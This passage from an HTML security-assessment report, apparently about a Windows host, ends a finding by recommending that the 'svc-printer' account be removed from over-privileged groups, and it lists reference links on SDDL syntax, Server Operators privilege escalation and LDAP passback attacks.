group.<br/><br/>This has a <br/><mark class="highlight-red"><strong>high</strong></mark> impact on the <mark class="highlight-blue"><strong>confidentiality</strong></mark><mark class="highlight-default">, </mark><mark class="highlight-blue"><strong>integrity</strong></mark><mark class="highlight-default">, </mark><mark class="highlight-blue"><strong>and availability </strong></mark>of the affected component.</td></tr><tr id="a603f137-7583-4298-a63b-d1092aa5c9b9"><td id="&lt;?AB" class="" style="width:653px">Remediation proposition</td><td id="BY@B" class="" style="width:653px">Remove <code><strong>svc-printer</strong></code> local account from <strong>Remote Management Users</strong> and <strong>Service Operators</strong> groups since it gives too much privileges to this user account. <br/><br/>If you really need to use those two privileges, create a different account exclusively for this purpose.<br/></td></tr></tbody></table><h1 id="1f09bffb-33cc-4820-9920-ad358d7f38e9" class="">Sources</h1><ul id="e43edcd2-adb6-496c-ba24-1a0378941f58" class="bulleted-list"><li style="list-style-type:disc">Understanding SSDL syntax : <a href="https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/">https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/</a></li></ul><ul id="6adfbbf1-f6c3-4c13-b980-520958adca05" class="bulleted-list"><li style="list-style-type:disc">Privilege escalation with Server Operators group : <a href="https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/">https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/</a></li></ul><ul id="7b12618a-8520-4d36-949c-7ad1a2f543ec" class="bulleted-list"><li style="list-style-type:disc">Passback attack : <a href="https://www.wolfandco.com/resources/insights/ldap-passback-attacks-how-to-secure-your-printers/">https://www.wolfandco.com/resources/insights/ldap-passback-attacks-how-to-secure-your-printers/</a></li></ul><p id="2f54b836-b482-4a66-8f01-700c5d0138f3" class="">
+</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
